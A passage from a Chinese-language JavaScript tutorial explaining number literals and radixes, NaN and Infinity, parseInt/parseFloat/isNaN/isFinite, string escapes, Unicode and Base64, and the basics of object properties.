   上面代码中，对 ``0.5`` 连续做25次平方，由于最后结果太接近0，超出了可表示的范围，JavaScript 就直接将其转为0。

   JavaScript 提供 ``Number`` 对象的 ``MAX_VALUE`` 和 ``MIN_VALUE`` 属性，返回可以表示的具体的最大值和最小值。

   .. code:: javascript

      Number.MAX_VALUE // 1.7976931348623157e+308
      Number.MIN_VALUE // 5e-324

数值的表示法
----------

   JavaScript 的数值有多种表示方法，可以用字面形式直接表示，比如 ``35`` （十进制）和 ``0xFF`` （十六进制）。

   数值也可以采用科学计数法表示，下面是几个科学计数法的例子。

   .. code:: javascript

      123e3 // 123000
      123e-3 // 0.123
      -3.1E+12
      .1e-23

   科学计数法允许字母 ``e`` 或 ``E`` 的后面，跟着一个整数，表示这个数值的指数部分。

   以下两种情况，JavaScript 会自动将数值转为科学计数法表示，其他情况都采用字面形式直接表示。

   **（1）小数点前的数字多于21位。**

   .. code:: javascript

      1234567890123456789012
      // 1.2345678901234568e+21
   
      123456789012345678901
      // 123456789012345680000

   **（2）小数点后的零多于5个。**

   .. code:: javascript

      // 小数点后紧跟5个以上的零，
      // 就自动转为科学计数法
      0.0000003 // 3e-7
   
      // 否则，就保持原来的字面形式
      0.000003 // 0.000003

数值的进制
--------

   使用字面量（literal）直接表示一个数值时，JavaScript 对整数提供四种进制的表示方法：十进制、十六进制、八进制、二进制。

   - 十进制：没有前导0的数值。
   - 八进制：有前缀 ``0o`` 或 ``0O`` 的数值，或者有前导0、且只用到0-7的八个阿拉伯数字的数值。
   - 十六进制：有前缀 ``0x`` 或 ``0X`` 的数值。
   - 二进制：有前缀 ``0b`` 或 ``0B`` 的数值。

   默认情况下，JavaScript 内部会自动将八进制、十六进制、二进制转为十进制。下面是一些例子。

   .. code:: javascript

      0xff // 255
      0o377 // 255
      0b11 // 3

   如果八进制、十六进制、二进制的数值里面，出现不属于该进制的数字，就会报错。

   .. code:: javascript

      0xzz // 报错
      0o88 // 报错
      0b22 // 报错

   上面代码中，十六进制出现了字母 ``z`` 、八进制出现数字 ``8`` 、二进制出现数字 ``2`` ，因此报错。

   通常来说，有前导0的数值会被视为八进制，但是如果前导0后面有数字 ``8`` 和 ``9`` ，则该数值被视为十进制。

   .. code:: javascript

      0888 // 888
      0777 // 511

   前导0表示八进制，处理时很容易造成混乱。ES5 的严格模式和 ES6，已经废除了这种表示法，但是浏览器为了兼容以前的代码，目前还继续支持这种表示法。

特殊数值
-------

   JavaScript 提供了几个特殊的数值。

正零和负零
~~~~~~~~

   前面说过，JavaScript 的64位浮点数之中，有一个二进制位是符号位。这意味着，任何一个数都有一个对应的负值，就连 ``0`` 也不例外。

   JavaScript 内部实际上存在2个 ``0`` ：一个是 ``+0`` ，一个是 ``-0`` ，区别就是64位浮点数表示法的符号位不同。它们是等价的。

   .. code:: javascript

      -0 === +0 // true
      0 === -0 // true
      0 === +0 // true

   几乎所有场合，正零和负零都会被当作正常的 ``0`` 。

   .. code:: javascript

      +0 // 0
      -0 // 0
      (-0).toString() // '0'
      (+0).toString() // '0'

   唯一有区别的场合是， ``+0`` 或 ``-0`` 当作分母，返回的值是不相等的。

   .. code:: javascript

      (1 / +0) === (1 / -0) // false

   上面的代码之所以出现这样结果，是因为除以正零得到 ``+Infinity`` ，除以负零得到 ``-Infinity`` ，这两者是不相等的（关于 ``Infinity`` 详见下文）。

NaN
~~~~

   **（1）含义**

    ``NaN`` 是 JavaScript 的特殊值，表示“非数字”（Not a Number），主要出现在将字符串解析成数字出错的场合。

   .. code:: javascript

      5 - 'x' // NaN

   上面代码运行时，会自动将字符串 ``x`` 转为数值，但是由于 ``x`` 不是数值，所以最后得到结果为 ``NaN`` ，表示它是“非数字”（ ``NaN`` ）。

   另外，一些数学函数的运算结果会出现 ``NaN`` 。

   .. code:: javascript

      Math.acos(2) // NaN
      Math.log(-1) // NaN
      Math.sqrt(-1) // NaN

    ``0`` 除以 ``0`` 也会得到 ``NaN`` 。

   .. code:: javascript

      0 / 0 // NaN

   需要注意的是， ``NaN`` 不是独立的数据类型，而是一个特殊数值，它的数据类型依然属于 ``Number`` ，使用 ``typeof`` 运算符可以看得很清楚。

   .. code:: javascript

      typeof NaN // 'number'

   **（2）运算规则**

    ``NaN`` 不等于任何值，包括它本身。

   .. code:: javascript

      NaN === NaN // false

   数组的 ``indexOf`` 方法内部使用的是严格相等运算符，所以该方法对 ``NaN`` 不成立。

   .. code:: javascript

      [NaN].indexOf(NaN) // -1

    ``NaN`` 在布尔运算时被当作 ``false`` 。

   .. code:: javascript

      Boolean(NaN) // false

    ``NaN`` 与任何数（包括它自己）的运算，得到的都是 ``NaN`` 。

   .. code:: javascript

      NaN + 32 // NaN
      NaN - 32 // NaN
      NaN * 32 // NaN
      NaN / 32 // NaN

Infinity
~~~~~~~~~

   **（1）含义**

    ``Infinity`` 表示“无穷”，用来表示两种场景。一种是一个正的数值太大，或一个负的数值太小，无法表示；另一种是非0数值除以0，得到 ``Infinity`` 。

   .. code:: javascript

      // 场景一
      Math.pow(2, 1024)
      // Infinity
   
      // 场景二
      0 / 0 // NaN
      1 / 0 // Infinity

   上面代码中，第一个场景是一个表达式的计算结果太大，超出了能够表示的范围，因此返回 ``Infinity`` 。第二个场景是 ``0`` 除以 ``0`` 会得到 ``NaN`` ，而非0数值除以 ``0`` ，会返回 ``Infinity`` 。

    ``Infinity`` 有正负之分， ``Infinity`` 表示正的无穷， ``-Infinity`` 表示负的无穷。

   .. code:: javascript

      Infinity === -Infinity // false
   
      1 / -0 // -Infinity
      -1 / -0 // Infinity

   上面代码中，非零正数除以 ``-0`` ，会得到 ``-Infinity`` ，负数除以 ``-0`` ，会得到 ``Infinity`` 。

   由于数值正向溢出（overflow）、负向溢出（underflow）和被 ``0`` 除，JavaScript 都不报错，所以单纯的数学运算几乎没有可能抛出错误。

    ``Infinity`` 大于一切数值（除了 ``NaN`` ）， ``-Infinity`` 小于一切数值（除了 ``NaN`` ）。

   .. code:: javascript

      Infinity > 1000 // true
      -Infinity < -1000 // true

    ``Infinity`` 与 ``NaN`` 比较，总是返回 ``false`` 。

   .. code:: javascript

      Infinity > NaN // false
      -Infinity > NaN // false
   
      Infinity < NaN // false
      -Infinity < NaN // false

   **（2）运算规则**

    ``Infinity`` 的四则运算，符合无穷的数学计算规则。

   .. code:: javascript

      5 * Infinity // Infinity
      5 - Infinity // -Infinity
      Infinity / 5 // Infinity
      5 / Infinity // 0

   0乘以 ``Infinity`` ，返回 ``NaN`` ；0除以 ``Infinity`` ，返回 ``0`` ； ``Infinity`` 除以0，返回 ``Infinity`` 。

   .. code:: javascript

      0 * Infinity // NaN
      0 / Infinity // 0
      Infinity / 0 // Infinity

    ``Infinity`` 加上或乘以 ``Infinity`` ，返回的还是 ``Infinity`` 。

   .. code:: javascript

      Infinity + Infinity // Infinity
      Infinity * Infinity // Infinity

    ``Infinity`` 减去或除以 ``Infinity`` ，得到 ``NaN`` 。

   .. code:: javascript

      Infinity - Infinity // NaN
      Infinity / Infinity // NaN

    ``Infinity`` 与 ``null`` 计算时， ``null`` 会转成0，等同于与 ``0`` 的计算。

   .. code:: javascript

      null * Infinity // NaN
      null / Infinity // 0
      Infinity / null // Infinity

    ``Infinity`` 与 ``undefined`` 计算，返回的都是 ``NaN`` 。

   .. code:: javascript

      undefined + Infinity // NaN
      undefined - Infinity // NaN
      undefined * Infinity // NaN
      undefined / Infinity // NaN
      Infinity / undefined // NaN

与数值相关的全局方法
----------------


parseInt()
~~~~~~~~~~~

   **（1）基本用法**

    ``parseInt`` 方法用于将字符串转为整数。

   .. code:: javascript

      parseInt('123') // 123

   如果字符串头部有空格，空格会被自动去除。

   .. code:: javascript

      parseInt('   81') // 81

   如果 ``parseInt`` 的参数不是字符串，则会先转为字符串再转换。

   .. code:: javascript

      parseInt(1.23) // 1
      // 等同于
      parseInt('1.23') // 1

   字符串转为整数的时候，是一个个字符依次转换，如果遇到不能转为数字的字符，就不再进行下去，返回已经转好的部分。

   .. code:: javascript

      parseInt('8a') // 8
      parseInt('12**') // 12
      parseInt('12.34') // 12
      parseInt('15e2') // 15
      parseInt('15px') // 15

   上面代码中， ``parseInt`` 的参数都是字符串，结果只返回字符串头部可以转为数字的部分。

   如果字符串的第一个字符不能转化为数字（后面跟着数字的正负号除外），返回 ``NaN`` 。

   .. code:: javascript

      parseInt('abc') // NaN
      parseInt('.3') // NaN
      parseInt('') // NaN
      parseInt('+') // NaN
      parseInt('+1') // 1

   所以， ``parseInt`` 的返回值只有两种可能，要么是一个十进制整数，要么是 ``NaN`` 。

   如果字符串以 ``0x`` 或 ``0X`` 开头， ``parseInt`` 会将其按照十六进制数解析。

   .. code:: javascript

      parseInt('0x10') // 16

   如果字符串以 ``0`` 开头，将其按照10进制解析。

   .. code:: javascript

      parseInt('011') // 11

   对于那些会自动转为科学计数法的数字， ``parseInt`` 会将科学计数法的表示方法视为字符串，因此导致一些奇怪的结果。

   .. code:: javascript

      parseInt(1000000000000000000000.5) // 1
      // 等同于
      parseInt('1e+21') // 1
   
      parseInt(0.0000008) // 8
      // 等同于
      parseInt('8e-7') // 8

   **（2）进制转换**

    ``parseInt`` 方法还可以接受第二个参数（2到36之间），表示被解析的值的进制，返回该值对应的十进制数。默认情况下， ``parseInt`` 的第二个参数为10，即默认是十进制转十进制。

   .. code:: javascript

      parseInt('1000') // 1000
      // 等同于
      parseInt('1000', 10) // 1000

   下面是转换指定进制的数的例子。

   .. code:: javascript

      parseInt('1000', 2) // 8
      parseInt('1000', 6) // 216
      parseInt('1000', 8) // 512

   上面代码中，二进制、六进制、八进制的 ``1000`` ，分别等于十进制的8、216和512。这意味着，可以用 ``parseInt`` 方法进行进制的转换。

   如果第二个参数不是数值，会被自动转为一个整数。这个整数只有在2到36之间，才能得到有意义的结果，超出这个范围，则返回 ``NaN`` 。如果第二个参数是 ``0`` 、 ``undefined`` 和 ``null`` ，则直接忽略。

   .. code:: javascript

      parseInt('10', 37) // NaN
      parseInt('10', 1) // NaN
      parseInt('10', 0) // 10
      parseInt('10', null) // 10
      parseInt('10', undefined) // 10

   如果字符串包含对于指定进制无意义的字符，则从最高位开始，只返回可以转换的数值。如果最高位无法转换，则直接返回 ``NaN`` 。

   .. code:: javascript

      parseInt('1546', 2) // 1
      parseInt('546', 2) // NaN

   上面代码中，对于二进制来说， ``1`` 是有意义的字符， ``5`` 、 ``4`` 、 ``6`` 都是无意义的字符，所以第一行返回1，第二行返回 ``NaN`` 。

   前面说过，如果 ``parseInt`` 的第一个参数不是字符串，会被先转为字符串。这会导致一些令人意外的结果。

   .. code:: javascript

      parseInt(0x11, 36) // 43
      parseInt(0x11, 2) // 1
   
      // 等同于
      parseInt(String(0x11), 36)
      parseInt(String(0x11), 2)
   
      // 等同于
      parseInt('17', 36)
      parseInt('17', 2)

   上面代码中，十六进制的 ``0x11`` 会被先转为十进制的17，再转为字符串。然后，再用36进制或二进制解读字符串 ``17`` ，最后返回结果 ``43`` 和 ``1`` 。

   这种处理方式，对于八进制的前缀0，尤其需要注意。

   .. code:: javascript

      parseInt(011, 2) // NaN
   
      // 等同于
      parseInt(String(011), 2)
   
      // 等同于
      parseInt(String(9), 2)

   上面代码中，第一行的 ``011`` 会被先转为字符串 ``9`` ，因为 ``9`` 不是二进制的有效字符，所以返回 ``NaN`` 。如果直接计算 ``parseInt('011', 2)`` ， ``011`` 则是会被当作二进制处理，返回3。

   JavaScript 不再允许将带有前缀0的数字视为八进制数，而是要求忽略这个 ``0`` 。但是，为了保证兼容性，大部分浏览器并没有部署这一条规定。

parseFloat()
~~~~~~~~~~~~~

    ``parseFloat`` 方法用于将一个字符串转为浮点数。

   .. code:: javascript

      parseFloat('3.14') // 3.14

   如果字符串符合科学计数法，则会进行相应的转换。

   .. code:: javascript

      parseFloat('314e-2') // 3.14
      parseFloat('0.0314E+2') // 3.14

   如果字符串包含不能转为浮点数的字符，则不再进行往后转换，返回已经转好的部分。

   .. code:: javascript

      parseFloat('3.14more non-digit characters') // 3.14

    ``parseFloat`` 方法会自动过滤字符串前导的空格。

   .. code:: javascript

      parseFloat('\t\v\r12.34\n ') // 12.34

   如果参数不是字符串，则会先转为字符串再转换。

   .. code:: javascript

      parseFloat([1.23]) // 1.23
      // 等同于
      parseFloat(String([1.23])) // 1.23

   如果字符串的第一个字符不能转化为浮点数，则返回 ``NaN`` 。

   .. code:: javascript

      parseFloat([]) // NaN
      parseFloat('FF2') // NaN
      parseFloat('') // NaN

   上面代码中，尤其值得注意， ``parseFloat`` 会将空字符串转为 ``NaN`` 。

   这些特点使得 ``parseFloat`` 的转换结果不同于 ``Number`` 函数。

   .. code:: javascript

      parseFloat(true)  // NaN
      Number(true) // 1
   
      parseFloat(null) // NaN
      Number(null) // 0
   
      parseFloat('') // NaN
      Number('') // 0
   
      parseFloat('123.45#') // 123.45
      Number('123.45#') // NaN

isNaN()
~~~~~~~~

    ``isNaN`` 方法可以用来判断一个值是否为 ``NaN`` 。

   .. code:: javascript

      isNaN(NaN) // true
      isNaN(123) // false

   但是， ``isNaN`` 只对数值有效，如果传入其他值，会被先转成数值。比如，传入字符串的时候，字符串会被先转成 ``NaN`` ，所以最后返回 ``true`` ，这一点要特别引起注意。也就是说， ``isNaN`` 为 ``true`` 的值，有可能不是 ``NaN`` ，而是一个字符串。

   .. code:: javascript

      isNaN('Hello') // true
      // 相当于
      isNaN(Number('Hello')) // true

   出于同样的原因，对于对象和数组， ``isNaN`` 也返回 ``true`` 。

   .. code:: javascript

      isNaN({}) // true
      // 等同于
      isNaN(Number({})) // true
   
      isNaN(['xzy']) // true
      // 等同于
      isNaN(Number(['xzy'])) // true

   但是，对于空数组和只有一个数值成员的数组， ``isNaN`` 返回 ``false`` 。

   .. code:: javascript

      isNaN([]) // false
      isNaN([123]) // false
      isNaN(['123']) // false

   上面代码之所以返回 ``false`` ，原因是这些数组能被 ``Number`` 函数转成数值，请参见《数据类型转换》一章。

   因此，使用 ``isNaN`` 之前，最好判断一下数据类型。

   .. code:: javascript

      function myIsNaN(value) {
        return typeof value === 'number' && isNaN(value);
      }

   判断 ``NaN`` 更可靠的方法是，利用 ``NaN`` 为唯一不等于自身的值的这个特点，进行判断。

   .. code:: javascript

      function myIsNaN(value) {
        return value !== value;
      }

isFinite()
~~~~~~~~~~~

    ``isFinite`` 方法返回一个布尔值，表示某个值是否为正常的数值。

   .. code:: javascript

      isFinite(Infinity) // false
      isFinite(-Infinity) // false
      isFinite(NaN) // false
      isFinite(undefined) // false
      isFinite(null) // true
      isFinite(-1) // true

   除了 ``Infinity`` 、 ``-Infinity`` 、 ``NaN`` 和 ``undefined`` 这几个值会返回 ``false`` ， ``isFinite`` 对于其他的数值都会返回 ``true`` 。

参考链接
-------

   - Dr. Axel Rauschmayer, [How numbers are encoded in JavaScript](http://www.2ality.com/2012/04/number-encoding.html)
   - Humphry, [JavaScript 中 Number 的一些表示上/下限](https://segmentfault.com/a/1190000000407658)

/🟠 字符串
=========

概述
---


定义
~~~

   字符串就是零个或多个排在一起的字符，放在单引号或双引号之中。

   .. code:: javascript

      'abc'
      "abc"

   单引号字符串的内部，可以使用双引号。双引号字符串的内部，可以使用单引号。

   .. code:: javascript

      'key = "value"'
      "It's a long journey"

   上面两个都是合法的字符串。

   如果要在单引号字符串的内部，使用单引号，就必须在内部的单引号前面加上反斜杠，用来转义。双引号字符串内部使用双引号，也是如此。

   .. code:: javascript

      'Did she say \'Hello\'?'
      // "Did she say 'Hello'?"
   
      "Did she say \"Hello\"?"
      // "Did she say "Hello"?"

   由于 HTML 语言的属性值使用双引号，所以很多项目约定 JavaScript 语言的字符串只使用单引号，本教程遵守这个约定。当然，只使用双引号也完全可以。重要的是坚持使用一种风格，不要一会使用单引号表示字符串，一会又使用双引号表示。

   字符串默认只能写在一行内，分成多行将会报错。

   .. code:: javascript

      'a
      b
      c'
      // SyntaxError: Unexpected token ILLEGAL

   上面代码将一个字符串分成三行，JavaScript 就会报错。

   如果长字符串必须分成多行，可以在每一行的尾部使用反斜杠。

   .. code:: javascript

      var longString = 'Long \
      long \
      long \
      string';
   
      longString
      // "Long long long string"

   上面代码表示，加了反斜杠以后，原来写在一行的字符串，可以分成多行书写。但是，输出的时候还是单行，效果与写在同一行完全一样。注意，反斜杠的后面必须是换行符，而不能有其他字符（比如空格），否则会报错。

   连接运算符（ ``+`` ）可以连接多个单行字符串，将长字符串拆成多行书写，输出的时候也是单行。

   .. code:: javascript

      var longString = 'Long '
        + 'long '
        + 'long '
        + 'string';

   如果想输出多行字符串，有一种利用多行注释的变通方法。

   .. code:: javascript

      (function () { /*
      line 1
      line 2
      line 3
      */}).toString().split('\n').slice(1, -1).join('\n')
      // "line 1
      // line 2
      // line 3"

   上面的例子中，输出的字符串就是多行。

转义
~~~

   反斜杠（\）在字符串内有特殊含义，用来表示一些特殊字符，所以又称为转义符。

   需要用反斜杠转义的特殊字符，主要有下面这些。

   -  ``\0``  ：null（ ``\u0000`` ）
   -  ``\b``  ：后退键（ ``\u0008`` ）
   -  ``\f``  ：换页符（ ``\u000C`` ）
   -  ``\n``  ：换行符（ ``\u000A`` ）
   -  ``\r``  ：回车键（ ``\u000D`` ）
   -  ``\t``  ：制表符（ ``\u0009`` ）
   -  ``\v``  ：垂直制表符（ ``\u000B`` ）
   -  ``\'``  ：单引号（ ``\u0027`` ）
   -  ``\"``  ：双引号（ ``\u0022`` ）
   -  ``\\``  ：反斜杠（ ``\u005C`` ）

   上面这些字符前面加上反斜杠，都表示特殊含义。

   .. code:: javascript

      console.log('1\n2')
      // 1
      // 2

   上面代码中， ``\n`` 表示换行，输出的时候就分成了两行。

   反斜杠还有三种特殊用法。

   （1） ``\HHH`` 

   反斜杠后面紧跟三个八进制数（ ``000`` 到 ``377`` ），代表一个字符。 ``HHH`` 对应该字符的 Unicode 码点，比如 ``\251`` 表示版权符号。显然，这种方法只能输出256种字符。

   （2） ``\xHH`` 

    ``\x`` 后面紧跟两个十六进制数（ ``00`` 到 ``FF`` ），代表一个字符。 ``HH`` 对应该字符的 Unicode 码点，比如 ``\xA9`` 表示版权符号。这种方法也只能输出256种字符。

   （3） ``\uXXXX`` 

    ``\u`` 后面紧跟四个十六进制数（ ``0000`` 到 ``FFFF`` ），代表一个字符。 ``XXXX`` 对应该字符的 Unicode 码点，比如 ``\u00A9`` 表示版权符号。

   下面是这三种字符特殊写法的例子。

   .. code:: javascript

      '\251' // "©"
      '\xA9' // "©"
      '\u00A9' // "©"
   
      '\172' === 'z' // true
      '\x7A' === 'z' // true
      '\u007A' === 'z' // true

   如果在非特殊字符前面使用反斜杠，则反斜杠会被省略。

   .. code:: javascript

      '\a'
      // "a"

   上面代码中， ``a`` 是一个正常字符，前面加反斜杠没有特殊含义，反斜杠会被自动省略。

   如果字符串的正常内容之中，需要包含反斜杠，则反斜杠前面需要再加一个反斜杠，用来对自身转义。

   .. code:: javascript

      "Prev \\ Next"
      // "Prev \ Next"

字符串与数组
~~~~~~~~~~

   字符串可以被视为字符数组，因此可以使用数组的方括号运算符，用来返回某个位置的字符（位置编号从0开始）。

   .. code:: javascript

      var s = 'hello';
      s[0] // "h"
      s[1] // "e"
      s[4] // "o"
   
      // 直接对字符串使用方括号运算符
      'hello'[1] // "e"

   如果方括号中的数字超过字符串的长度，或者方括号中根本不是数字，则返回 ``undefined`` 。

   .. code:: javascript

      'abc'[3] // undefined
      'abc'[-1] // undefined
      'abc'['x'] // undefined

   但是，字符串与数组的相似性仅此而已。实际上，无法改变字符串之中的单个字符。

   .. code:: javascript

      var s = 'hello';
   
      delete s[0];
      s // "hello"
   
      s[1] = 'a';
      s // "hello"
   
      s[5] = '!';
      s // "hello"

   上面代码表示，字符串内部的单个字符无法改变和增删，这些操作会默默地失败。

length 属性
~~~~~~~~~~

    ``length`` 属性返回字符串的长度，该属性也是无法改变的。

   .. code:: javascript

      var s = 'hello';
      s.length // 5
   
      s.length = 3;
      s.length // 5
   
      s.length = 7;
      s.length // 5

   上面代码表示字符串的 ``length`` 属性无法改变，但是不会报错。

字符集
-----

   JavaScript 使用 Unicode 字符集。JavaScript 引擎内部，所有字符都用 Unicode 表示。

   JavaScript 不仅以 Unicode 储存字符，还允许直接在程序中使用 Unicode 码点表示字符，即将字符写成 ``\uxxxx`` 的形式，其中 ``xxxx`` 代表该字符的 Unicode 码点。比如， ``\u00A9`` 代表版权符号。

   .. code:: javascript

      var s = '\u00A9';
      s // "©"

   解析代码的时候，JavaScript 会自动识别一个字符是字面形式表示，还是 Unicode 形式表示。输出给用户的时候，所有字符都会转成字面形式。

   .. code:: javascript

      var f\u006F\u006F = 'abc';
      foo // "abc"

   上面代码中，第一行的变量名 ``foo`` 是 Unicode 形式表示，第二行是字面形式表示。JavaScript 会自动识别。

   我们还需要知道，每个字符在 JavaScript 内部都是以16位（即2个字节）的 UTF-16 格式储存。也就是说，JavaScript 的单位字符长度固定为16位长度，即2个字节。

   但是，UTF-16 有两种长度：对于码点在 ``U+0000`` 到 ``U+FFFF`` 之间的字符，长度为16位（即2个字节）；对于码点在 ``U+10000`` 到 ``U+10FFFF`` 之间的字符，长度为32位（即4个字节），而且前两个字节在 ``0xD800`` 到 ``0xDBFF`` 之间，后两个字节在 ``0xDC00`` 到 ``0xDFFF`` 之间。举例来说，码点 ``U+1D306`` 对应的字符为 ``𝌆，`` 它写成 UTF-16 就是 ``0xD834 0xDF06`` 。

   JavaScript 对 UTF-16 的支持是不完整的，由于历史原因，只支持两字节的字符，不支持四字节的字符。这是因为 JavaScript 第一版发布的时候，Unicode 的码点只编到 ``U+FFFF`` ，因此两字节足够表示了。后来，Unicode 纳入的字符越来越多，出现了四字节的编码。但是，JavaScript 的标准此时已经定型了，统一将字符长度限制在两字节，导致无法识别四字节的字符。上一节的那个四字节字符 ``𝌆`` ，浏览器会正确识别这是一个字符，但是 JavaScript 无法识别，会认为这是两个字符。

   .. code:: javascript

      '𝌆'.length // 2

   上面代码中，JavaScript 认为 ``𝌆`` 的长度为2，而不是1。

   总结一下，对于码点在 ``U+10000`` 到 ``U+10FFFF`` 之间的字符，JavaScript 总是认为它们是两个字符（ ``length`` 属性为2）。所以处理的时候，必须把这一点考虑在内，也就是说，JavaScript 返回的字符串长度可能是不正确的。

Base64 转码
----------

   有时，文本里面包含一些不可打印的符号，比如 ASCII 码0到31的符号都无法打印出来，这时可以使用 Base64 编码，将它们转成可以打印的字符。另一个场景是，有时需要以文本格式传递二进制数据，那么也可以使用 Base64 编码。

   所谓 Base64 就是一种编码方法，可以将任意值转成 0～9、A～Z、a-z、 ``+`` 和 ``/`` 这64个字符组成的可打印字符。使用它的主要目的，不是为了加密，而是为了不出现特殊字符，简化程序的处理。

   JavaScript 原生提供两个 Base64 相关的方法。

   -  ``btoa()`` ：任意值转为 Base64 编码
   -  ``atob()`` ：Base64 编码转为原来的值

   .. code:: javascript

      var string = 'Hello World!';
      btoa(string) // "SGVsbG8gV29ybGQh"
      atob('SGVsbG8gV29ybGQh') // "Hello World!"

   注意，这两个方法不适合非 ASCII 码的字符，会报错。

   .. code:: javascript

      btoa('你好') // 报错

   要将非 ASCII 码字符转为 Base64 编码，必须中间插入一个转码环节，再使用这两个方法。

   .. code:: javascript

      function b64Encode(str) {
        return btoa(encodeURIComponent(str));
      }
   
      function b64Decode(str) {
        return decodeURIComponent(atob(str));
      }
   
      b64Encode('你好') // "JUU0JUJEJUEwJUU1JUE1JUJE"
      b64Decode('JUU0JUJEJUEwJUU1JUE1JUJE') // "你好"

参考链接
-------

   - Mathias Bynens, [JavaScript’s internal character encoding: UCS-2 or UTF-16?](http://mathiasbynens.be/notes/javascript-encoding)
   - Mathias Bynens, [JavaScript has a Unicode problem](http://mathiasbynens.be/notes/javascript-unicode)
   - Mozilla Developer Network, [Window.btoa](https://developer.mozilla.org/en-US/docs/Web/API/Window.btoa)

/🟠 对象
========

概述
---


生成方法
~~~~~~~

   对象（object）是 JavaScript 语言的核心概念，也是最重要的数据类型。

   什么是对象？简单说，对象就是一组“键值对”（key-value）的集合，是一种无序的复合数据集合。

   .. code:: javascript

      var obj = {
        foo: 'Hello',
        bar: 'World'
      };

   上面代码中，大括号就定义了一个对象，它被赋值给变量 ``obj`` ，所以变量 ``obj`` 就指向一个对象。该对象内部包含两个键值对（又称为两个“成员”），第一个键值对是 ``foo: 'Hello'`` ，其中 ``foo`` 是“键名”（成员的名称），字符串 ``Hello`` 是“键值”（成员的值）。键名与键值之间用冒号分隔。第二个键值对是 ``bar: 'World'`` ， ``bar`` 是键名， ``World`` 是键值。两个键值对之间用逗号分隔。

键名
~~~

   对象的所有键名都是字符串（ES6 又引入了 Symbol 值也可以作为键名），所以加不加引号都可以。上面的代码也可以写成下面这样。

   .. code:: javascript

      var obj = {
        'foo': 'Hello',
        'bar': 'World'
      };

   如果键名是数值，会被自动转为字符串。

   .. code:: javascript

      var obj = {
        1: 'a',
        3.2: 'b',
        1e2: true,
        1e-2: true,
        .234: true,
        0xFF: true
      };
   
      obj
      // Object {
      //   1: "a",
      //   3.2: "b",
      //   100: true,
      //   0.01: true,
      //   0.234: true,
      //   255: true
      // }
   
      obj['100'] // true

   上面代码中，对象 ``obj`` 的所有键名虽然看上去像数值，实际上都被自动转成了字符串。

   如果键名不符合标识名的条件（比如第一个字符为数字，或者含有空格或运算符），且也不是数字，则必须加上引号，否则会报错。

   .. code:: javascript

      // 报错
      var obj = {
        1p: 'Hello World'
      };
   
      // 不报错
      var obj = {
        '1p': 'Hello World',
        'h w': 'Hello World',
        'p+q': 'Hello World'
      };

   上面对象的三个键名，都不符合标识名的条件，所以必须加上引号。

   对象的每一个键名又称为“属性”（property），它的“键值”可以是任何数据类型。如果一个属性的值为函数，通常把这个属性称为“方法”，它可以像函数那样调用。

   .. code:: javascript

      var obj = {
        p: function (x) {
          return 2 * x;
        }
      };
   
      obj.p(1) // 2

   上面代码中，对象 ``obj`` 的属性 ``p`` ，就指向一个函数。

   如果属性的值还是一个对象，就形成了链式引用。

   .. code:: javascript

      var o1 = {};
      var o2 = { bar: 'hello' };
   
      o1.foo = o2;
      o1.foo.bar // "hello"

   上面代码中，对象 ``o1`` 的属性 ``foo`` 指向对象 ``o2`` ，就可以链式引用 ``o2`` 的属性。

   对象的属性之间用逗号分隔，最后一个属性后面可以加逗号（trailing comma），也可以不加。

   .. code:: javascript

      var obj = {
        p: 123,
        m: function () { ... },
      }

   上面的代码中， ``m`` 属性后面的那个逗号，有没有都可以。

   属性可以动态创建，不必在对象声明时就指定。

   .. code:: javascript

      var obj = {};
      obj.foo = 123;
      obj.foo // 123

   上面代码中，直接对 ``obj`` 对象的 ``foo`` 属性赋值，结果就在运行时创建了 ``foo`` 属性。

对象的引用
~~~~~~~~

   如果不同的变量名指向同一个对象，那么它们都是这个对象的引用，也就是说指向同一个内存地址。修改其中一个变量，会影响到其他所有变量。

   .. code:: javascript

      var o1 = {};
      var o2 = o1;
   
      o1.a = 1;
      o2.a // 1
   
      o2.b = 2;
      o1.b // 2

   上面代码中， ``o1`` 和 ``o2`` 指向同一个对象，因此为其中任何一个变量添加属性，另一个变量都可以读写该属性。

   此时，如果取消某一个变量对于原对象的引用，不会影响到另一个变量。

   .. code:: javascript

      var o1 = {};
      var o2 = o1;
   
      o1 = 1;
      o2 // {}

   上面代码中， ``o1`` 和 ``o2`` 指向同一个对象，然后 ``o1`` 的值变为1，这时不会对 ``o2`` 产生影响， ``o2`` 还是指向原来的那个对象。

   但是，这种引用只局限于对象，如果两个变量指向同一个原始类型的值。那么，变量这时都是值的拷贝。

   .. code:: javascript

      var x = 1;
      var y = x;
   
      x = 2;
      y // 1

   上面的代码中，当 ``x`` 的值发生变化后， ``y`` 的值并不变，这就表示 ``y`` 和 ``x`` 并不是指向同一个内存地址。

表达式还是语句？
~~~~~~~~~~~~~

   对象采用大括号表示，这导致了一个问题：如果行首是一个大括号，它到底是表达式还是语句？

   .. code:: javascript

      { foo: 123 }

   JavaScript 引擎读到上面这行代码，会发现可能有两种含义。第一种可能是，这是一个表达式，表示一个包含 ``foo`` 属性的对象；第二种可能是，这是一个语句，表示一个代码区块，里面有一个标签 ``foo`` ，指向表达式 ``123`` 。

   为了避免这种歧义，JavaScript 引擎的做法是，如果遇到这种情况，无法确定是对象还是代码块，一律解释为代码块。

   .. code:: javascript

      { console.log(123) } // 123

   上面的语句是一个代码块，而且只有解释为代码块，才能执行。

   如果要解释为对象，最好在大括号前加上圆括号。因为圆括号的里面，只能是表达式，所以确保大括号只能解释为对象。

   .. code:: javascript

      ({ foo: 123 }) // 正确
      ({ console.log(123) }) // 报错

   这种差异在 ``eval`` 语句（作用是对字符串求值）中反映得最明显。

   .. code:: javascript

      eval('{foo: 123}') // 123
      eval('({foo: 123})') // {foo: 123}

   上面代码中，如果没有圆括号， ``eval`` 将其理解为一个代码块；加上圆括号以后，就理解成一个对象。

属性的操作
--------


属性的读取
~~~~~~~~

   读取对象的属性，有两种方法，一种是使用点运算符，还有一种是使用方括号运算符。

   .. code:: javascript

      var obj = {
        p: 'Hello World'
      };
   
      obj.p // "Hello World"
      obj['p'] // "Hello World"

   上面代码分别采用点运算符和方括号运算符，读取属性 ``p`` 。

   请注意，如果使用方括号运算符，键名必须放在引号里面，否则会被当作变量处理。

   .. code:: javascript

      var foo = 'bar';
   
      var obj = {
        foo: 1,
        bar: 2
      };
   
      obj.foo  // 1
      obj[foo]  // 2

   上面代码中，引用对象 ``obj`` 的 ``foo`` 属性时，如果使用点运算符， ``foo`` 就是字符串；如果使用方括号运算符，但是不使用引号，那么 ``foo`` 就是一个变量，指向字符串 ``bar`` 。

   方括号运算符内部还可以使用表达式。

   .. code:: javascript

      obj['hello' + ' world']
      obj[3 + 3]

